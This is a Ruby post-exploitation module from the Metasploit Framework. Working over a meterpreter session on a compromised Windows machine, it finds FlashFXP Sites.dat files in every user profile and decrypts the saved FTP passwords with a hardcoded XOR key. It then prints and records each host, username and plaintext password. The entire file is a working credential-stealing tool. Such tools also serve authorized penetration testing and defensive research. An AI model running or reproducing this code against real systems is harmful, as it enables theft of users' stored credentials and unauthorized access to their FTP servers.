# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather FlashFXP Saved Password Extraction',
				'Description'   => %q{ This module extracts weakly encrypted saved FTP Passwords 
					from FlashFXP. It finds saved FTP connections in the Sites.dat file. },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

	end

	def run
		@fxppaths = []
		@userpaths = []
		os = session.sys.config.sysinfo['OS']
		drive = session.fs.file.expand_path("%SystemDrive%")
		if os =~ /Windows 7|Vista|2008/
			@appdata = '\\AppData\\Roaming\\FlashFXP\\'
			@users = drive + '\\Users'
			@userpaths << drive + '\\ProgramData\\FlashFXP\\'
		else
			@appdata = '\\Application Data\\FlashFXP\\'
			@users = drive + '\\Documents and Settings'
		end
		get_users()
		@userpaths.each{|up| get_ver_dirs(up)}
		@fxppaths.each do |fxp|
			get_ini(fxp)
		end
	end

	def get_users
		session.fs.dir.foreach(@users) do |path|
			next if path =~ /^(\.|\.\.|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			@userpaths << "#{@users}\\#{path}\\#{@appdata}\\"
		end
	end

	def get_ver_dirs(path)
		begin
			session.fs.dir.foreach(path) do |sub|
				next if sub =~ /^(\.|\.\.)$/
				@fxppaths << "#{path}#{sub}\\Sites.dat"
			end
		rescue
			print_status("The following path could not be accessed or does not exist: #{path}")
		end
	end

	def get_ini(filename)
		begin
			config = client.fs.file.new(filename,'r')
			parse = config.read
			ini = Rex::Parser::Ini.from_s(parse)
			if ini == {}
				print_status("Unable to parse file, may be encrypted using external password: #{filename}")
			end
			ini.each_key do |group|
				host = ini[group]['IP']
				username = ini[group]['user']
				epass = ini[group]['pass']
				port = ini[group]['port']
				next if epass == nil or epass == ""
				passwd = decrypt(epass)
			
				print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
				report_auth_info(
							:host  => host,
							:port => port,
							:sname => 'FTP',
							:user => username,
							:pass => passwd
						)
			end
		rescue
			print_status("Either could not find or could not open file #{filename}")
		end
	end

	def decrypt(pwd)
		key =  "yA36zA48dEhfrvghGRg57h5UlDv3"
		pass = ""
		cipher = [pwd].pack("H*")

		(0..(cipher.length)-2).each do |index|
			xored = cipher[index + 1,1].unpack("C").first ^ key[index,1].unpack("C").first
			if ((xored - cipher[index,1].unpack("C").first < 0))
				xored += 255
			end
			pass << (xored - cipher[index,1].unpack("C").first).chr
		end
		return pass
	end
end
